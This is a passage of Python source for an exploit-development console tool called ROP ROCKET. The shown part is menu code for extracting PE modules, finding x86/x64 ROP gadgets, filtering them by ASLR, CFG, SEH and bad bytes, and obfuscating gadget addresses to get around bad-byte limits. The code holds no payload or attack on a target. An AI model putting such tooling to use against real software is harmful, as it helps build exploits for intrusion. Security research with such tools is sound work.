	if opt["bad_bytes_imgbase"]:
		togBadIm=res+"["+gre+"X"+res+"]"
	else:
		togBadIm=res+"["+gre+" "+res+"]"
	togBadOf=res+"["+gre+"X"+res+"]"
	
	bad=opt["badBytes"]

	curBadBytes=binaryToStr(bad)
	if len(curBadBytes)==0:
		curBadBytes="None"
	text = "  {} can be highly impactful in exploitation. We can exclude gadget addresses\n  or other bytes (such as values) from having bad bytes in search results or gadget chains.\n  Generally, one should be checked, or most bad bytes would be ignored.\n\n".format(gre+"Bad bytes or bad chars"+res)
	text +=mag+"  Find Bad Bytes in Offsets: \t\t\t\t {}\n".format(togBadOf)
	text +="  \tOffsets include virtual address. This cannot be disabled. \t\t{}\n".format("")
	text +=mag+"  Find Bad Bytes in ImageBase + VirtualAddress + Offset: {}\n".format(togBadIm)
	text +=mag+"  Default ImageBase: {}\t VirtualAddress: {}\n".format(cya+hex(pe[n].ImageBase)+mag, cya+hex(pe[n].VirtualAdd)+mag)

	text +=mag+"  Current Bad Bytes: {}\n\n".format(cya+curBadBytes+res)
	
	
	# text+=yel+"  {}\t {}             {} {} Include gadgets with ASLR in results.\n".format(cya+"1"+res,mag+"ASLR" +res, togASLR, "-"+yel)
	# text+=yel+"  {}\t {}              {} {} Include gadgets with CFG in results.\n".format(cya+"2"+res,mag+"CFG" +res, togCFG, "-"+yel)
	# text+=yel+"  {}\t {}              {} {} Include gadgets with SEH in results.\n".format(cya+"3"+res,mag+"SEH" +res, togSEH, "-"+yel)
	# text+=yel+"  {}\t {}          {} {} Include gadgets that are Windows DLLs in results.\n".format(cya+"4"+res,mag+"Windows" +res, togSystemWin, "-"+yel)
	# text+=yel+" {}\t {}        {} {} Include gadgets with bad bytes in results.\n".format(cya+"5"+res,mag+"Bad bytes" +res, togBad, "-"+yel)
	text+=yel+"  {}\t {}          {} {} Clear all bad bytes.\n".format(cya+"c"+res,mag+"Clear bad bytes" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {}            {} {} Add additional bad bytes to exclude.\n".format(cya+"b"+res,mag+"Add bad bytes" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {}         {} {} Remove bad bytes from exclusion criteria.\n".format(cya+"r"+res,mag+"Remove bad bytes" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {} {}           {} Toggle bad bytes in ImgBase.\n".format(cya+"1"+res,mag+"Toggle ImgBase" +res, "   ", "-"+yel)
	# text+=yel+"  {}\t {} {}           {} Toggle bad bytes in Offsets.\n".format(cya+"2"+res,mag+"Toggle Offsets" +res, "   ", "-"+yel)
	text+=yel+"  {}\t {} {} {} Change ImageBase.\n".format(cya+"2"+res,mag+"Change default ImageBase" +res, "   ", "-"+yel)



	print (text)
def changeImageBase():
	# print ("  Enter new ImageBase in hexadecimal:"

	print("  Enter new ImageBase in hexadecimal:  \n")
	print (yel+"  ImageBase:  "+cya, end="")
	imageBase=input()

	if "0x" not in imageBase:
		"0x"+imageBase
	try:
		imageBase2= int(imageBase,16)
	except:
		print (res,"  This input was not accepted:", imageBase)
	pe[n].ImageBase=imageBase2
	pe[n].startLoc=imageBase2 + pe[n].VirtualAdd
	print (mag,"   ImageBase + VirtualAddress: ",res, hex(pe[n].startLoc))
	print (res)
def toggleImgBase():
	global opt
	if opt["bad_bytes_imgbase"]:
		opt["bad_bytes_imgbase"]=False
	else:
		opt["bad_bytes_imgbase"]=True
def toggleOffsets():
	global opt
	if opt["bad_bytes_offset"]:
		opt["bad_bytes_offset"]=False
	else:
		opt["bad_bytes_offset"]=True

def uiAddBadBytes():
	global opt
	global bad
	bad=opt["badBytes"]
	curBadBytes=binaryToStr(bad)
	if len(curBadBytes)==0:
		curBadBytes="None"

	print (gre+"   Current Bad bytes: " + cya + curBadBytes)
	print (res+"\n   Add each hexadecimal byte must be separated by a '\\x' or space.\n   Hit enter to end input.\n")

	print(yel + "   Add_Bytes: " +mag, end="")
	userIN = input()
	# print ("userIN", userIN)
	selections = userIN.replace("\\x", " ")
	# print ("selections", selections)
	newBytes = selections.split()
	# print ("newBytes", newBytes)
	print(res)
	newBytes2=[]
	for each in newBytes:
		nB=int(each, 16)
		if hx(nB,2) not in curBadBytes:
			newBytes2.append(nB)
	# print (newBytes2)
	opt["badBytes"]+=bytes(newBytes2)
	print (gre+"   New Bad bytes: " + cya +curBadBytes + red + binaryToStr(bytes(newBytes2)))
def uiChangeExcludedRegs():
	pass
	global opt

	rStr=""
	for r in opt["regsExc"]:
		rStr+=cya+r +res+", "
	try:
		rStr=rStr[:-2]
	except:
		pass
	if len(rStr)==0:
		rStr="None"
	text=res+"\n  Registers to Exclude: {}\n".format(rStr+res)
	print (text)
	print (res+"\n   Add each register to exclude separated by a ',' or space.\n  Hit enter to end input. Enter with no input clears all.\n")

	print(yel + "   Exclude_Regs: " +mag, end="")
	userIN = input()
	# print ("userIN", userIN)
	selections = userIN.replace(",", " ")
	# print ("selections", selections)
	newRegs = selections.split()
	# print ("newBytes", newBytes)
	print(res)
	
	newRegs=list(set(newRegs))
	# print (newBytes2)
	opt["regsExc"]=newRegs
	rStr=""
	for r in opt["regsExc"]:
		rStr+=cya+r +res+", "
	try:
		rStr=rStr[:-2]
	except:
		pass
	if len(rStr)==0:
		rStr="None"
	text=gre+"\n  Registers to Exclude: {}\n".format(rStr+res)
	print (text)
def uiRemoveBadBytes():
	global bad
	global opt
	bad=opt["badBytes"]
	curBadBytes=binaryToStr(bad)
	if len(curBadBytes)==0:
		curBadBytes="None"

	print (gre+"   Current Bad bytes: " + cya + curBadBytes)
	print (res+"\n   Remove each hexadecimal byte must be separated by a '\\x' or space.\n   Hit enter to end input and cause these to be removed.\n")

	print(yel + "   Remove_Bytes: " +mag, end="")
	userIN = input()
	# print ("userIN", userIN)
	selections = userIN.replace("\\x", " ")
	# print ("selections", selections)
	newBytes = selections.split()
	# print ("newBytes", newBytes)
	print(res)
	newBytes2=[]
	test=bytearray(opt["badBytes"])
	test2=(set(list(test)))
	test=bytearray(test2)
	for each in newBytes:
		nB=int(each, 16)
		if hx(nB,2) in curBadBytes:
			newBytes2.append(nB)
			test.remove(nB)
	opt["badBytes"]=bytes(test)
	bad = opt["badBytes"]
	print (gre+"   New Bad bytes: " + cya + binaryToStr(opt["badBytes"]))

def getExclusionCrtieria():
	print(uiShowExclusionSettings())
	global opt
	global bad
	userIN=""

	# if opt["acceptCFG"]:
	# if opt["acceptSEH"]:
	# if opt["acceptSystemWin"]:
	# if opt["acceptASLR"]:



	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"Printing>" + mag + "Exclusion_Criteria> " +res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "1" or userIN[0:1].lower() == "a":
				if opt["acceptASLR"]:
					opt["acceptASLR"]=False
				else:
					opt["acceptASLR"]=True
				
				print ("  Include ASLR gadgets: ", mag+str(opt["acceptASLR"])+res)
			elif userIN[0:1] == "6" or userIN[0:2].lower() == "cb":
				opt["badBytes"]=b''
				print ("  Bad bytes have been cleared.")
			elif userIN[0:1] == "2" or userIN[0:1].lower() == "c":
				if opt["acceptCFG"]==False:
					opt["acceptCFG"]=True
				else:
					opt["acceptCFG"]=False
				print ("  Include CFG gadgets: ", mag+str(opt["acceptCFG"])+res)
			elif userIN[0:1] == "3" or userIN[0:1].lower() == "s":
				if opt["acceptSEH"]:
					opt["acceptSEH"]=False
				else:
					opt["acceptSEH"]=True
				
				print ("  Include ASLR gadgets: ", mag+str(opt["acceptSEH"])+res)
			elif userIN[0:1] == "4" or userIN[0:1].lower() == "w":
				if opt["acceptSystemWin"]==False:
					opt["acceptSystemWin"]=True
				else:
					opt["acceptSystemWin"]=False
				print ("  Include gadgets from Windows DLLs: ", mag+str(opt["acceptSystemWin"])+res)
			elif userIN[0:1] == "5" or userIN[0:1].lower() == "b":
				if opt["checkForBadBytes"]==False:
					opt["checkForBadBytes"]=True
					# print ("opt bad ", opt["badBytes"])
					bad=opt["badBytes"]
				else:
					opt["checkForBadBytes"]=False

				print ("  Check for bad bytes: ", mag+str(opt["checkForBadBytes"])+res)
				if opt["checkForBadBytes"]:
					print ("  Gadgets with bad bytes in the addresses will not be included in results.")
				else:
					print ("  Gadgets with bad bytes in the addresses will be included in results.")
			elif userIN[0:1] == "7" or userIN[0:1].lower() == "b":
				uiAddBadBytes()
			elif userIN[0:1] == "8" or userIN[0:1] == "r":
				uiRemoveBadBytes()
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowExclusionSettings()) 
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break		
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")

def uiShowPrintSettings():
	global opt
	try:
		opt["bx86Extracted"]=fg.x86
		opt["bx64Extracted"]=fg.x64
	except:
		pass
	if opt["bx86Get"]:
		togx86=res+"["+gre+"X"+res+"]"
	else:
		togx86=res+"["+gre+" "+res+"]"
	
	if opt["bx64Get"]:
		togx64=res+"["+gre+"X"+res+"]"
	else:
		togx64=res+"["+gre+" "+res+"]"


	if opt["bx86Extracted"]:
		togx86Ex=res+""+cya+"FOUND"+res+""
	else:
		togx86Ex=res+""+cya+"NOT FOUND"+res+""
	
	if opt["bx64Extracted"]:
		togx64Ex=res+""+cya+"FOUND"+res+""
	else:
		togx64Ex=res+""+cya+"NOT FOUND"+res+""
	
	toglength=res+"["+gre+hex(opt["lenMax"])+res+"]"
	# togK=res+"["+gre+hex(sh.encodeUSDKey)+res+"]"
	# togAV=res+"["+gre+hex(sh.addUSDVal)+res+"]"

	# togP=res+"["+gre+" "+res+"]"
	# if sh.useSharedData:
	# 	togSD=res+"["+gre+"X"+res+"]"
	# else:
	# 	togSD=res+"["+gre+" "+res+"]"

	text=whi+"  ROP ROCKET will print {} to file. You can also introduce {} on what to\n  exclude, such as limiting number of lines per gadget or excluding system DLLs. These can be set\n  in the {} as well. To select everything with these settings from the main menu, type {}.\n\n".format(gre+"found ROP gadgets"+whi,  gre+"constraints"+whi,gre+"config file"+res,mag+"P"+res)

	
	text+=gre+"\n      Current Status            \n"
	text+=whi+"\n  x86 Gadgets: {}\t\tx64 Gadgets: {}\n".format(togx86Ex,togx64Ex)

	
	text+=gre+"\n      Printing ROP Gadgets            \n"
	text+=yel+"   {}\t {}              {} {} Print all x86 gadgets.\n".format(cya+"1"+res,mag+"x86" +res, togx86, "-"+yel, cya+"fs:[0x30]"+yel)
	
	
	text+=yel+"   {}\t {}              {} {} Print all x64 gadgets.\n".format(cya+"2"+res,mag+"x64" +res, togx64, "-"+yel)


	text+=yel+"   {}\t {}        {} {} Set maximum number of lines per gadget to print.\n".format(cya+"3"+res,mag+"Max lines" +res, toglength, "-"+yel)
	text+=yel+"   {}\t {}  {} {} Exclusion criteria for gadgets to be left out of results.\n".format(cya+"4"+res,mag+"Exclusion criteria" +res, "  ", "-"+yel)

	text+=yel+"   {}\t {}   {} {} Prints all available gadgets.\n".format(cya+"5"+res,mag+"Print Gadgets  " +res, "   ", "-"+yel)
	
	text+=gre+"   {} {} Show this submenu\n".format(cya+"h"+gre, res+"-"+gre)
	text+=gre+"   {} {} Exit\n".format(cya+"x"+gre,res+"-"+res)

	return text

def uiShowGetGadgetsSettings():
	global opt
	try:
		opt["bx86Extracted"]=fg.x86
		opt["bx64Extracted"]=fg.x64
	except:
		pass
	if opt["bx86Get"]:
		togx86=res+"["+gre+"X"+res+"]"
	else:
		togx86=res+"["+gre+" "+res+"]"
	
	if opt["bx64Get"]:
		togx64=res+"["+gre+"X"+res+"]"
	else:
		togx64=res+"["+gre+" "+res+"]"


	if opt["bx86Extracted"]:
		togx86Ex=res+""+cya+"FOUND"+res+""
	else:
		togx86Ex=res+""+cya+"NOT FOUND"+res+""
	
	if opt["bx64Extracted"]:
		togx64Ex=res+""+cya+"FOUND"+res+""
	else:
		togx64Ex=res+""+cya+"NOT FOUND"+res+""
	
	togBytes=res+"["+gre+hex(opt["bytesMax"])+res+"]"
	# togK=res+"["+gre+hex(sh.encodeUSDKey)+res+"]"
	# togAV=res+"["+gre+hex(sh.addUSDVal)+res+"]"

	# togP=res+"["+gre+" "+res+"]"
	# if sh.useSharedData:
	# 	togSD=res+"["+gre+"X"+res+"]"
	# else:
	# 	togSD=res+"["+gre+" "+res+"]"

	text=whi+"  ROP ROCKET {} for analysis. It can do this for both {}. If attempting\n  {}, you will want both. These settings can also be set in the {}.\n  All gadgets found are saved to disk automatically, allowing for quick start next time.\n\n".format(gre+"gets gadgets"+whi, gre+"x86 and x64"+whi,  gre+"Heaven's Gate"+whi,gre+"config file"+res)

	
	text+=gre+"\n      Current Status            \n"
	text+=whi+"\n  x86 Gadgets: {}\t\tx64 Gadgets: {}\n".format(togx86Ex,togx64Ex)

	
	text+=gre+"\n      Getting ROP Gadgets            \n"
	text+=yel+"   {}\t {}              {} {} This searches for x86 gadgets.\n".format(cya+"1"+res,mag+"x86" +res, togx86, "-"+yel, cya+"fs:[0x30]"+yel)
	
	
	text+=yel+"   {}\t {}              {} {} This searches for x64 gadgets.\n".format(cya+"2"+res,mag+"x64" +res, togx64, "-"+yel)


	text+=yel+"   {}\t {}{} {} This removes all found ROP gadgets. A new search will be required.\n".format(cya+"3"+res,mag+"Clear all gadgets" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {}  {} {} Set num bytes to analyze for gadgets. A new search will be required.\n".format(cya+"4"+res,mag+"Number of bytes" +res, togBytes, "-"+yel)

	text+=yel+"   {}\t {}    {} {} This searches for gadgets based on desired settings.\n".format(cya+"5"+res,mag+"Get Gadgets  " +res, "   ", "-"+yel)
	
	text+=gre+"   {} {} Show this submenu\n".format(cya+"h"+gre, res+"-"+gre)
	text+=gre+"   {} {} Exit\n".format(cya+"x"+gre,res+"-"+res)

	return text


def uiShowPEFileSettings():

	global opt
	if opt["bImgExc"]:
		togIE=res+"["+gre+"X"+res+"]"
	else:
		togIE=res+"["+gre+" "+res+"]"
	
	if opt["bSystemDlls"]:
		togSD=res+"["+gre+"X"+res+"]"
	else:
		togSD=res+"["+gre+" "+res+"]"
	
	if opt["bOtherDlls"]:
		togOD=res+"["+gre+"X"+res+"]"
	else:
		togOD=res+"["+gre+" "+res+"]"

	if opt["bImgExcExtracted"]:
		togIEEx=res+""+cya+"EXTRACTED"+res+""
	else:
		togIEEx=res+""+cya+"NOT EXTRACTED"+res+""
	
	if opt["bSystemDllsExtracted"]:
		togSDEx=res+""+cya+"EXTRACTED"+res+""
	else:
		togSDEx=res+""+cya+"NOT EXTRACTED"+res+""
	
	if opt["bOtherDllsExtracted"]:
		togODEx=res+""+cya+"EXTRACTED"+res+""
	else:
		togODEx=res+""+cya+"NOT EXTRACTED"+res+""

	# togK=res+"["+gre+hex(sh.encodeUSDKey)+res+"]"
	# togAV=res+"["+gre+hex(sh.addUSDVal)+res+"]"

	# togP=res+"["+gre+" "+res+"]"
	# if sh.useSharedData:
	# 	togSD=res+"["+gre+"X"+res+"]"
	# else:
	# 	togSD=res+"["+gre+" "+res+"]"

	text=whi+"  ROP ROCKET must {} in order to analyze them for {} and other properties.\n  If you do not plan to use a DLL, such as system DLL, you may wish to {} it from analysis \n  to speed up the process. These settings can also be set in the {}. The values from\n  the config are used to start.\n\n".format(gre+"extract DLLs"+whi, gre+"gadgets"+whi,gre+"exclude"+whi,gre+"config file"+res)

	text+=gre+"\n      Current Status            \n"
	text+=whi+"\n  Img. Executable: {}\n  System DLLs:     {}\t\tOther DLLs: {}\n".format(togIEEx,togSDEx,togODEx)

	out2=""
	for dll in pe:
		# print (dll,len(dll.data) )
		if len(pe[dll].data) > 1:
			out2+=blu+dll+res+","
	out2=out2[:-1]		
	if out2=="":
		out2=blu+"None"+res
	text+=whi+"\n  Extracted Modules: {}\n".format(out2)


	text+=gre+"\n      Extraction Options            \n"
	text+=yel+"   {}\t {}    {} {} This extracts only the executable itself.\n".format(cya+"1"+res,mag+"Img. Executable" +res, togIE, "-"+yel, cya+"fs:[0x30]"+yel)
	
	
	text+=yel+"   {}\t {}        {} {} This also extracts Windows system DLLS.\n".format(cya+"2"+res,mag+"System DLLs" +res, togSD, "-"+yel)


	text+=yel+"   {}\t {}         {} {} This extracts any other non-system DLLs it can locate.\n".format(cya+"3"+res,mag+"Other DLLs" +res, togSD, "-"+yel)

	text+=yel+"   {}\t {} {} {} This removes all metadata for PE files. A new extraction will be required.\n".format(cya+"4"+res,mag+"Clear all PE files" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {} {} {} This performs a fresh extraction based on desired settings.\n".format(cya+"5"+res,mag+"Extract Selected  " +res, "   ", "-"+yel)
	
	text+=gre+"   {} {} Show this submenu\n".format(cya+"h"+gre, res+"-"+gre)
	text+=gre+"   {} {} Exit\n".format(cya+"x"+gre,res+"-"+res)

	return text
def peFileSubMenu():
	print(uiShowPEFileSettings())
	global opt
	userIN=""

	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"PE_Files>" + mag + "Options> " +res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "1" or userIN[0:1] == "i":
				if opt["bImgExc"]:
					opt["bImgExc"]=False
				else:
					opt["bImgExc"]=True
				
				print ("  Extract Img. Executable: ", mag+str(opt["bImgExc"])+res)
			elif userIN[0:1] == "2" or userIN[0:1] == "s":
				if opt["bSystemDlls"]==False:
					opt["bSystemDlls"]=True
				else:
					opt["bSystemDlls"]=False
				print ("  Extract System DLLs: ", mag+str(opt["bSystemDlls"])+res)
			elif userIN[0:1] == "3" or userIN[0:1] == "o":
				if not opt["bOtherDlls"]:
					opt["bOtherDlls"]=True
				else:
					opt["bOtherDlls"]=False
				print ("  Extract Other DLLs: ", mag+str(opt["bOtherDlls"])+res)
			elif userIN[0:1] == "4" or userIN[0:1] == "c":
				print ("  All previously extracted PE files have been cleared. A new extraction is necessary for any ROP.")
				clearPEs()
				opt["bImgExcExtracted"]=False
				opt["bSystemDllsExtracted"]=False
				opt["bOtherDllsExtracted"]=False
			elif userIN[0:1] == "5" or userIN[0:1] == "e":
				print ("  Extraction for selected PE files will begin.")
				getPEs()
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break			
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowPEFileSettings())
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")


def getGadgetsSubMenu():
	print(uiShowGetGadgetsSettings())
	global opt
	userIN=""

	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"Get_Gadgets>" + mag + "Options> " +res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "1" or userIN[0:3] == "x86":
				if opt["bx86Get"]:
					opt["bx86Get"]=False
				else:
					opt["bx86Get"]=True
				
				print ("  Get gadgets for x86: ", mag+str(opt["bx86Get"])+res)
				# getGadgets()
			elif userIN[0:1] == "2" or userIN[0:3] == "x64":
				if opt["bx64Get"]==False:
					opt["bx64Get"]=True
				else:
					opt["bx64Get"]=False
				print ("  Get gadgets for x64: ", mag+str(opt["bx64Get"])+res)
				# getGadgetsx64()
			elif userIN[0:1] == "3" or userIN[0:1] == "c":
				clearGadgets()
				print ("  This erases all previously saved ROP gadgets.")
			elif userIN[0:1] == "4" or userIN[0:1] == "n":
				print(cya+" Enter number of bytes to analyze for gadgets: " +res, end="")
				userBytes = input()
				print(res)
				try: 
					try:
						userBytes=int(userBytes)
					except:
						userBytes=int(userBytes,16)
					opt["bytesMax"]=userBytes
					print ("  The number of bytes to extract and analyze for gadgets is now " + hex(opt["bytesMax"])+"."+red+"\n  Please note for this to take effect, all gadgets must be cleeared, and you must get gadgets again."+res)				
					print ("  The max number of lines for a gadget can be set in the print submenu.")
				except:
						print ("  Input is rejected.")					
				
			elif userIN[0:1] == "5" or userIN[0:1] == "g":
				print ("  This will fetch all gadgets according to the settings.")
				if opt["bx86Get"] and not opt["bx64Get"]:
					print ("  Getting x86 gadgets...")
					if opt["bx86Extracted"]:
						print ("  You may wish to clear previously saved gadgets first.")
					getGadgets()
					print ("  Fetched")
				elif not opt["bx86Get"] and  opt["bx64Get"]:
					print ("  Getting x64 gadgets...")
					if opt["bx64Extracted"]:
						print ("  You may wish to clear previously saved gadgets first.")
					getGadgetsx64()
					print ("  Fetched")
				elif opt["bx86Get"] and  opt["bx64Get"]:
					print ("  Getting x86 and x64 gadgets...")
					if opt["bx64Extracted"] or opt["bx86Extracted"]:
						print ("  You may wish to clear previously saved gadgets first.")
					getGadgetsx6486()
					print ("  Fetched")
				else:
					print ("   None are selected!\n")

			elif userIN[0:1] == "5" or userIN[0:1] == "b":
				print ("  This will fetch both x86 and x64 gadgets.")
				getGadgetsx6486()
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break			
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowGetGadgetsSettings())
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")
def printSubMenu():
	print(uiShowPrintSettings())
	global opt
	userIN=""

	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"Printing>" + mag + "Options> " +res, end="")
			userIN = input()
			print(res)
			if userIN[0:1] == "1" or userIN[0:3] == "x86":
				if opt["bx86Print"]:
					opt["bx86Print"]=False
				else:
					opt["bx86Print"]=True
				
				print ("  Print gadgets for x86: ", mag+str(opt["bx86Print"])+res)
				if opt["bx86Print"] and not opt["bx86Extracted"]:
					print ("  NOTE: You still need to extract your x86 gadgets first.")

				# getGadgets()
			elif userIN[0:1] == "2" or userIN[0:3] == "x64":
				if opt["bx64Print"]==False:
					opt["bx64Print"]=True
				else:
					opt["bx64Print"]=False
				print ("  Print gadgets for x64: ", mag+str(opt["bx64Print"])+res)
				if opt["bx64Print"] and not opt["bx86Extracted"]:
					print ("  NOTE: You still need to extract your x64 gadgets first.")

				# getGadgetsx64()
			elif userIN[0:1] == "4" or userIN[0:1] == "V":
				getExclusionCrtieria()
				
			elif userIN[0:1] == "3" or userIN[0:1] == "n":
				print(cya+" Enter max num. of lines per gadget. Ret does NOT count: " +res, end="")
				userLines = input()
				print(res)
				try: 
					try:
						userLines=int(userLines)
					except:
						userLines=int(userLines,16)
					opt["lenMax"]=userLines
					print ("  The number of lines per gadget to be printed is now " + hex(opt["lenMax"])+".")				
					
				except:
						print ("  Input is rejected.")					
				
			elif userIN[0:1] == "5" or userIN[0:1] == "p"or userIN[0:1] == "P":
				print ("  This will print gadgets according to settings.")
				if opt["bx86Print"] and opt["bx86Extracted"]:
					print ("  Printing x86 gadgets...")
					printGadgetsx86()
				if opt["bx64Print"] and opt["bx64Extracted"]:
					print ("  Printing x64 gadgets...")
					printGadgetsx64()
				if not opt["bx86Print"] and not opt["bx64Print"]:
					print ("  None selected")

			elif userIN[0:1] == "5" or userIN[0:1] == "b":
				print ("  This will fetch both x86 and x64 gadgets.")
				getGadgetsx6486()
			elif userIN[0:1] == "q" or userIN[0:1] == "x":
				break			
			elif userIN[0:1] == "h" or userIN[0:7] == "display":
				print(uiShowPrintSettings())
			else:
				print("   Invalid input. Enter " + red + "x"+res+" to exit Style.\n")
		except Exception as e:
			print (e)
			print(traceback.format_exc())
			print ("exception")



def uiShowObfSettings():
	global opt
	# try:
	# 	opt["bx86Extracted"]=fg.x86
	# 	opt["bx64Extracted"]=fg.x64
	# except:
	# 	pass
	# if opt["bx86Get"]:
	# 	togx86=res+"["+gre+"X"+res+"]"
	# else:
	# 	togx86=res+"["+gre+" "+res+"]"
	
	print ("\n\n")
	text=whi+"  ROP ROCKET will {} a gadget address, resulting in a {}. This can\n  enable you to use {}, in spite of bad bytes. This is done via obfuscation,\n  such as integer overflow. You may supply a gadget address to obfuscate.\n\n".format(gre+"obfuscate"+whi,  gre+"push r32 / ret"+whi,gre+"'forbidden' gadgets"+res,mag+filenameRaw+whi, gre+"lookup module"+res)
		
	# text+=whi+"\n  Current Lookup Module: {}\n".format(gre+opt["lookupMod"]+res)
	
	rStr=""
	for r in opt["regsExc"]:
		rStr+=cya+r +res+", "
	try:
		rStr=rStr[:-2]
	except:
		pass
	if len(rStr)==0:
		rStr="None"
	text+=res+"\n  Registers to Exclude: {}\n".format(rStr+res)

	bad=opt["badBytes"]

	curBadBytes=binaryToStr(bad)
	if len(curBadBytes)==0:
		curBadBytes="None"
	text +="\n  Current Bad Bytes: {}\n\n".format(cya+curBadBytes+res)
	text+=gre+"\n      Obfuscating ROP Gadgets            \n"
	# text+=yel+"   {}\t {}    {} {} Change the lookup module.\n".format(cya+"1"+res,mag+"Lookup Module" +res, "   ", "-"+yel, cya+"fs:[0x30]"+yel)
	
	text+=yel+"   {}\t {} {} {} Set first register where result will be stored.\n".format(cya+"0"+res,mag+"Set first register" +res, "   ", "-"+yel)
	
	text+=yel+"   {}\t {} {} {} Obfuscate with integer overflow.\n".format(cya+"1"+res,mag+"Integer overflow" +res, "   ", "-"+yel)


	text+=yel+"   {}\t {} {} {} Obfuscate with found integer overflow.\n".format(cya+"2"+res,mag+"Found int. overflow" +res, "   ", "-"+yel)

	text+=yel+"   {}\t {} {} {} Obfuscate with xor gadget.\n".format(cya+"3"+res,mag+"Xor gadget" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {} {} {} Obfuscate with found xor gadget.\n".format(cya+"4"+res,mag+"Found xor gadget" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {} {} {} Obfuscate with not gadget.\n".format(cya+"5"+res,mag+"Not gadget" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {}  {} {} Clear all bad bytes.\n".format(cya+"6"+res,mag+"Clear bad bytes" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {}    {} {} Add additional bad bytes to exclude.\n".format(cya+"7"+res,mag+"Add bad bytes" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {} {} {} Remove bad bytes.\n".format(cya+"8"+res,mag+"Remove bad bytes" +res, "   ", "-"+yel)
	text+=yel+"   {}\t {} {} {} Change excluded registers.\n".format(cya+"9"+res,mag+"Excluded regs" +res, "   ", "-"+yel)


	# text+=yel+"   {}\t {}        {} {} Set maximum number of lines per gadget to print.\n".format(cya+"3"+res,mag+"Max lines" +res, toglength, "-"+yel)
	# text+=yel+"   {}\t {}  {} {} Exclusion criteria for gadgets to be left out of results.\n".format(cya+"4"+res,mag+"Exclusion criteria" +res, "  ", "-"+yel)

	# text+=yel+"   {}\t {}   {} {} Prints all available gadgets.\n".format(cya+"5"+res,mag+"Print Gadgets  " +res, "   ", "-"+yel)
	
	text+=gre+"   {} {} Show this submenu\n".format(cya+"h"+gre, res+"-"+gre)
	text+=gre+"   {} {} Exit\n".format(cya+"x"+gre,res+"-"+res)

	return text

def setFirstReg():
	global opt
	try:
		if opt["first_reg_enabled"]:
			togFR=res+"["+gre+"X"+res+"]"
		else:
			togFR=res+"["+gre+" "+res+"]"
	except:
		opt["first_reg_enabled"]=False
		togFR=res+"["+gre+"  "+res+"]"


	# print(yel + "   Exclude_Regs: " +mag, end="")
	# userIN = input()
	try:
		text=yel+"\n  First Register: \t{}.\n".format(gre+opt["first_reg"]+res)
	except:
		text=yel+"\n  First Register: \t{}.\n".format(gre+"None"+res)

	text+=yel+"  First Register Enabled: {}\n".format(togFR)
	
	text+=res+"\n  The first register is where the result of obfuscation is stored.\n  E.g. {} - the result is in {}.\n".format(gre+"xor eax, edx"+res, gre+"eax"+res)
	text+=res+"\n  If not set, then it will attempt any combination of registers not excluded {}.\n".format(gre+"xor eax, edx"+res, gre+"eax"+res)

	text+=res+"\n  Set the register to be the first register. {}\n".format("")
	text+= res+"  Hit enter to end input." +" Type {} to {}.\n".format(gre+"d"+res, gre+"disable first reg"+res)
	print (text)

	print (yel+"  First Register: "+mag, end="")
	userIN = input()
	if userIN =="d":
		opt["first_reg_enabled"]=False
		print ("  First register disabled.")
		return
	# print ("userIN", userIN)
	# selections = userIN.replace(",", " ")
	# print ("selections", selections)
	# newRegs = selections.split()
	# print ("newBytes", newBytes)
	print(res)
	
	opt["first_reg"]=userIN
	opt["first_reg_enabled"]=True

	

	text=gre+"\n  FirstReg: {}\n".format(cya+opt["first_reg"]+res)
	print (text)
def printObfMenu():
	print(uiShowObfSettings())
	global opt
	userIN=""
	while userIN != "e" or userIN !="x":		#Loops on keyboard input
		try:			#Will break the loop on entering x
			print(yel + " ROP_ROCKET>"+ cya+"Obfuscation> " +res, end="")
			userIN = input()
			print(res)
			# badRegs=["eax", "ebx"]
			# excludeRegs=badRegs
			excludeRegs=opt['regsExc']
			bad=opt['badBytes']
			try:
				first_reg_enabled=opt["first_reg_enabled"]
			except:
				first_reg_enabled=False
				opt["first_reg_enabled"]=False
			try:
				opt["first_reg"]=opt["first_reg"]
			except:
				firstReg=None
				opt["first_reg"]=None
			if userIN[0:4] == "1234" or userIN[0:1] == "l":
				
				print(cya+"  Capitalization or abbreviation does not matter. E.g. kernel32 or kern.\n  Enter new module name: " +mag, end="")
				userLines = input()
				user= userLines.lower()
				print(res) 
				for dll in pe:
					lcase=pe[dll].modName.lower()
					if user in lcase:
						opt["lookupMod"]=pe[dll].modName
						break
				print (gre+ "  New lookup module:", res+opt["lookupMod"])

			elif userIN[0:1] == "1" or userIN[0:3] == "x64":
				print(cya+"  Enter hexadecimal value: " +mag, end="")
				userLines = input()
				desired= int(userLines,16)
				print(res) 
				

				if not opt["first_reg_enabled"]:
